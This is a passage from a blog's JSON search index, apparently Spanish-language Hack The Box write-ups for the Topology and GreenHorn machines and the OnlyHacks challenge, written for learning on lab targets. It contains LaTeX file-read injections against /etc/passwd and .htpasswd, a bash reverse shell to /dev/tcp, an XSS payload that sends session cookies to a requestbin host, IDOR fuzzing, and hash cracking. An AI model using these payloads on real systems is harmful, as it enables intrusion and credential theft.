2025","externalUrl":null,"permalink":"/tags/crontabs/","section":"Tags","summary":"","title":"Crontabs","type":"tags"},{"content":"","date":"21 febrero 2025","externalUrl":null,"permalink":"/tags/file-read/","section":"Tags","summary":"","title":"File-Read","type":"tags"},{"content":"","date":"21 febrero 2025","externalUrl":null,"permalink":"/tags/gnuplot/","section":"Tags","summary":"","title":"Gnuplot","type":"tags"},{"content":"","date":"21 febrero 2025","externalUrl":null,"permalink":"/tags/idor/","section":"Tags","summary":"","title":"IDOR","type":"tags"},{"content":"","date":"21 febrero 2025","externalUrl":null,"permalink":"/tags/latex/","section":"Tags","summary":"","title":"Latex","type":"tags"},{"content":"","date":"21 febrero 2025","externalUrl":null,"permalink":"/tags/subdominio/","section":"Tags","summary":"","title":"Subdominio","type":"tags"},{"content":"","date":"21 febrero 2025","externalUrl":null,"permalink":"/tags/sudo/","section":"Tags","summary":"","title":"Sudo","type":"tags"},{"content":"\rDescripci√≥n: #\rUna m√°quina en la que tenemos que hacer una inyecci√≥n LaTeX para poder leer archivos y as√≠ conseguir el hash del usuario, para luego, mediante una tarea recurrente, ganar root.\nEnumeraci√≥n #\rsudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn IP -oG allPorts -p- Escanea todos los puertos 1-65535 . ‚Äîopen Solo muestra los puertos que est√©n abiertos. -sS Stealt scan, cambia el modo de escane haciendo que no se complete el hanshake. ‚Äîmin-rate 5000 Como m√≠nimo va a enviar 5000 paquetes por segundo. -vvv Aumenta la verbosidad, mostrando la m√°xima informacion posible mientras se ejecuta. -n Desactiva la resolucion DNS; no va a tratar de resolver los nombres de dominio. -Pn Nmap por defecto manda un ping a la IP; esto lo desactiva. -oG allPorts Guarda el escaneo en formato oG en el archivo llamado allPorts. Este escaneo nos dio dos puertos: el 22 y el 80. Vamos a hacer un escaneo m√°s exhaustivo a estos puertos.\nsudo nmap -sCV -p22,80 IP -A -oN target -sCV Esto ejecuta una serie de scripts predeterminados de Nmap para obtener informaci√≥n adicional sobre los servicios que se encuentran abiertos, como versiones de servicios, detalles del sistema operativo, vulnerabilidades conocidas y la versi√≥n exacta. -p22, 80 Especifica qu√© puertos se van a escanear. -A Activa el descubrimiento de sistema operativo, la deteccion de version, script scanning y hace un traceroute. La pagina HTTP que est√° en el puerto 80 usa Apache 2.4.41.\nPuerto 80 #\rAl momento de entrar al link ‚ÄúLatex Equation Generator‚Äù veremos que es un subdmonio por lo que tendremos que agregarlo al /etc/hosts para que nos muestre lo siguiente.\nAlgo que podemos tratar es listar los archivos dentro de este subdmonio por lo que vamos a ingresar a la siguiente URL dejando el ultimo / .\nRevisando los archivos, lo √∫nico √∫til est√° en equationtest.tex ya que nos muestra c√≥mo estan tratando la entrada Latex la web.\n\\documentclass{standalone} \\input{header} \\begin{document} $ \\int_{a}^b\\int_{c}^d f(x,y)dxdy $ \\end{document} Podemos observar que la entrada est√° entre los signos de d√≥lar. Leyendo la p√°gina, nos dicen que LaTeX est√° en el modo ‚Äúinline math‚Äù. Buscando acerca de este modo, nos encontramos con que hay tres formas de tratarlo:\n$ . . .$ \\begin{math} . . . \\end{math} ( . . . ) Foothold #\rPor lo que ahora sabemos porque est√° entre esos signos y confirmamos que la entrada va a estar as√≠ planeando una inyecci√≥n.\nPayloadsAllTheThings\nVamos a tratar de empezar a leer archivos del sistema con la inyecci√≥n de codigo.\n$ \\lstinputlisting{/etc/passwd} $ Una vez confirmamos que podemos leer archivos vamos a empezar a leer archivos de configuraci√≥n que nos permit√°n ingresar al sistema.\n$ \\lstinputlisting{/etc/apache2/sites-enabled/000-default.conf} $ En este archivo encontramos varios directorios entre ellos uno que pertence al subdominio dev.topology.htb lo agregamos al /etc/hosts y al ingresar nos pide una contrase√±a.\nVamos a listar archivos de configuracion por defecto de apache sobre el directorio correspondiente a este subdominio.\n$ \\lstinputlisting{/var/www/dev/.htaccess} $ Por ultimo vamos a listar este archivo.\n$ \\lstinputlisting{/var/www/dev/.htpasswd} $ Nos vamos a encontrar un usuario junto con su hash, vamos a copiarlo y guardarlo en un archivo .txt para hacerle fuerza bruta con hashcat:\nhashcat hash.txt --wordlist /usr/share/wordlist/rockyou.txt --user Esto nos dara su contrase√±a para iniciar sesion mediante ssh.\nRoot #\rEnumeraci√≥n #\rPrimero vamos a hacer el tratamiento basico de la shell:\nexport TERM=xterm Listo ahora vamos a tratar de listar archivos y permisos a ver si encontramos algo, pero nos daremos cuenta rapidamente que no tenemos permitido el uso de sudo ni ningun permiso extra√±o por lo que lo unico que puede tener algo interesante son las crontab pero no nos permiten listarlas entonces vamos a usar la herramienta Pspy.\n#Maquina atacante python3 -m http.server 80 #Maquina victima wget IP/pspy64 chmod +x pspy64 ./pspy64 Luego de ejecutar el ultimo comando si esperamos un rato podremos ver que hay una script que se ejecuta cada minuto /opt/gnuplot/getdata.sh .\nSi analizamos esta salida nos daremos cuenta que lo que se esta haciendo cada minuto es buscar en el directorio /opt/gnuplot/ todos los archivos con extension plt y los ejecuta.\nSi tratamos de ingresar al directorio no nos lo permite pero en cambio si creamos un archivo y lo movemos a esa direccion no habra ningun conflicto. Buscando escalaciones de privilegios con gnuplot que es el binario que se ejecuta encontramos la siguiente Exploit.\n#Maquina atacante nc -lvnp 4444 #Maquina victima nano rev.plt system \u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/IP/4444 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; mv rev.plt /opt/gnuplot/ Con esto tendremos acceso como root y habremos completado la maquina.\n","date":"21 febrero 2025","externalUrl":null,"permalink":"/htb/maquinas/topology/","section":"Hack The Box","summary":"","title":"Topology","type":"maquinas"},{"content":"","date":"21 febrero 2025","externalUrl":null,"permalink":"/tags/web/","section":"Tags","summary":"","title":"Web","type":"tags"},{"content":"Al ingresar a la url tenemos la opcion de registrarnos e iniciar sesi√≥n que es lo primero que vamos a hacer.\nDentro podremos ver una web de citas en la que la unica persona interesante es Renata, esto debido a que nos dice que siempre esta conectada, por lo que le vamos a dar match y vamos a hablar con ella.\nEn este punto hay dos formas de resolver la maquina una es haciendo un Cross-Site-Scripting y la otra es modifcando la url debido a que podemos ver que cada chat tiene un id.\nVamos a mostrar la primera si tratamos de usar un titulo html en la conversacion con renata este respondera al contenido:\n\u0026lt;h1\u0026gt;Hi\u0026lt;/h1\u0026gt; Vamos a tratar de conseguir la cookie de su sesion con el siguiente comando:\n\u0026lt;script\u0026gt;document.location=\u0026#39;http://requestbinLink? c=\u0026#39;+document.cookie\u0026lt;/script\u0026gt; Vamos a ir a esta pagina http://requestbin.whapi.cloud/ crearemos una nueva request y remplazaremos la url en el comando, si hace click en el link y recargamos la pagina de la request tendremos lo siguiente:\nRemplazaremos esa cookie en el navegador usando inspeccionar y podremos ver los chats de renata junto con la flag.\nAhora vamos con la segunda forma, cuando entramos al chat de renata podemos ver como la url es:\nhttp://94.237.55.96:37246/chat/?rid=6 Si cambiamos el valor del seis podremos ver otros chats hay una forma de probar esto de manera automatica con ffuf para verificar que sea un IDOR:\n#Creamos el diccionario sed 1 100 \u0026gt; id.txt ffuf -w id.txt -u \u0026#39;http://94.237.55.96:37246/chat/?rid=FUZZ\u0026#39; -H \u0026#34;Cookie: session=TUCOOKIE\u0026#34; -mc 200 Esto nos devolvio dos posibles chats pero uno es el nuestro por lo que si probamos con el otro tendremos nuevamente la flag.\n","date":"20 febrero 2025","externalUrl":null,"permalink":"/htb/challenges/onlyhacks/","section":"Hack The Box","summary":"","title":"OnlyHacks","type":"challenges"},{"content":"\rDescripci√≥n : #\rUna m√°quina bastante sencilla en la que la enumeraci√≥n es la clave para hallar la primera contrase√±a, que te servir√° para usar un CVE y obtener una shell. Ya para el escalamiento de privilegios, algo absurdo y poco √∫til, pero entretenido.\nEnumeraci√≥n #\rComo siempre, vamos a empezar descubriendo qu√© puertos hay y con qu√© servicios.\nsudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn IP -oG allports nmap -sCV -p80,22,3000 IP -oN target Vemos una p√°gina en el puerto 80, por lo que vamos a agregar la IP al /etc/hosts.\nCuando abrimos la p√°gina, vemos que en la parte inferior dice \u0026ldquo;admin\u0026rdquo;. Si le damos clic, nos lleva a un inicio de sesi√≥n. Dejaremos esto para m√°s adelante.\nAhora vamos a revisar la p√°gina, pero por el puerto 3000. Despu√©s de buscar un rato, encontramos una especie de repositorio. Si revisamos estos archivos, encontramos un archivo llamado pass.php.\nEsto nos deja un hash que, si usamos un hash identifier, nos dice que es un SHA-512. Por lo tanto, con John the Ripper lo podemos decodificar.\njohn --format=Raw-SHA512 hash.txt /usr/share/wordlist/rockyou.txt Si volvemos al login que hab√≠amos encontrado y usamos esta contrase√±a, nos permite iniciar sesi√≥n. Si miramos qu√© tecnolog√≠as tiene la p√°gina, nos damos cuenta de que tiene un Pluck 4.7.18, que tiene un CVE que podemos explotar con la contrase√±a que encontramos. Si copiamos este exploit de GitHub, podemos obtener una shell.\nPrimero, vamos a crear un entorno virtual de Python:\npython -m venv \u0026#34;Enviroment name\u0026#34; source \u0026#34;Enviroment name\u0026#34;/bin/activate E instalamos este m√≥dulo para que el script de GitHub funcione sin problemas:\npip3 install requests_toolbelt Ahora ponemos un nc en escucha y ejecutamos el script con sus par√°metros:\nnc -lvnp 4444 python3 exploit_pluckv4.7.18_RCE.py --password iloveyou1 --ip 10.10.16.47 --port 4444 --host http://greenhorn.htb Y con esto tenemos una shell:\nSi tratamos de cambiar a uno de los dos usuarios, no vamos a encontrar forma de hacerlo. Por lo tanto, al final tratamos de usar la misma contrase√±a con el usuario Junior y nos funcion√≥.\nSi miramos dentro de la carpeta de Junior, hallamos dos cosas: un PDF y la flag. Vamos a montar un servidor HTTP con Python para llevar ese PDF a nuestra m√°quina.\npython3 -m http.server [puerto] wget http://IP:[puerto]/\u0026#39;Using OpenVAS.pdf\u0026#39; Dentro del pdf nos encontramos una especie de carta con una contrase√±a difuminada\nSi buscamos formas de conseguir esta contrase√±a nos vamos a encontrar este github Depix, ya viendo esto vamos a hacer dos cosas clonar el repositorio y extraer la imagen del pdf en una pagina que nos permita esto, para luego descifrar la contrase√±a.\ngit clone https://github.com/spipm/Depix python3 depix.py -p ../imagen-pdf -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png ","date":"30 noviembre 2024","externalUrl":null,"permalink":"/htb/maquinas/greenhorn/","section":"Hack The Box","summary":"","title":"GreenHorn","type":"maquinas"},{"content":"","date":"30 noviembre 2024","externalUrl":null,"permalink":"/tags/pluk/","section":"Tags","summary":"","title":"Pluk","type":"tags"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]